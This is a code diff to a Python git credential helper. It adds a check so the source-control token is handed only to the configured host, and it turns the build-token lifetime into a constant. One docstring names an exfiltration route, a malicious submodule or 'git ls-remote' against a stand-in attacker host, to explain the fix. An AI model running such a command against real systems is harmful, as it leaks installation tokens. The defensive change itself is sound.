@@ -41,6 +41,9 @@ CACHE_FILE = CACHE_DIR / "scm-creds.json"
 LOCK_FILE = CACHE_DIR / "scm-creds.lock"
 CACHE_REFRESH_BUFFER_SECONDS = 5 * 60
 REQUEST_TIMEOUT_SECONDS = 15
+# Image-build sandboxes have no control plane to refresh against. They live
+# for minutes, so we treat the injected token as good for one hour.
+BUILD_MODE_TOKEN_TTL_SECONDS = 60 * 60
 
 
 def _log(message: str) -> None:
@@ -92,8 +95,7 @@ def _credentials_from_env() -> dict[str, object] | None:
     """Build credentials from VCS_CLONE_TOKEN if present.
 
     Image-build sandboxes don't have a control plane to call, so the manager
-    injects a one-shot token directly into the env. We treat it as valid for
-    one hour — image builds run for minutes.
+    injects a one-shot token directly into the env.
     """
     token = os.environ.get("VCS_CLONE_TOKEN", "")
     if not token:
@@ -102,9 +104,23 @@ def _credentials_from_env() -> dict[str, object] | None:
     return {
         "username": username,
         "password": token,
-        "expires_at_epoch_ms": int((time.time() + 3600) * 1000),
+        "expires_at_epoch_ms": int((time.time() + BUILD_MODE_TOKEN_TTL_SECONDS) * 1000),
         "scm_provider": "env",
     }
+
+
+def _is_authorized_host(input_lines: dict[str, str]) -> bool:
+    """Return True iff git is asking about our configured SCM host.
+
+    The system-wide credential helper would otherwise hand the SCM token to
+    any host git resolves — a malicious submodule URL or `git ls-remote
+    https://attacker.example/...` could exfiltrate the installation token.
+    """
+    requested_host = input_lines.get("host", "").strip().lower()
+    if not requested_host:
+        return False
+    expected_host = os.environ.get("VCS_HOST", "github.com").strip().lower()
+    return requested_host == expected_host
 
 
 def _read_cached() -> dict[str, object] | None:
@@ -226,6 +242,16 @@ def main(argv: list[str] | None = None) -> int:
         return 0
 
     input_lines = _read_protocol_input(sys.stdin)
+
+    # Host-scoping: never hand the SCM token to a host other than the one
+    # this sandbox was configured for. git accepts an empty response as
+    # "I have nothing", which is the right behaviour here — fall through
+    # to any other configured helper, otherwise fail the auth cleanly.
+    if not _is_authorized_host(input_lines):
+        requested = input_lines.get("host", "<unknown>")
+        expected = os.environ.get("VCS_HOST", "github.com")
+        _log(f"refusing to serve credentials for host={requested!r} (expected {expected!r})")
+        return 0
 
     try:
         credentials = _get_credentials()
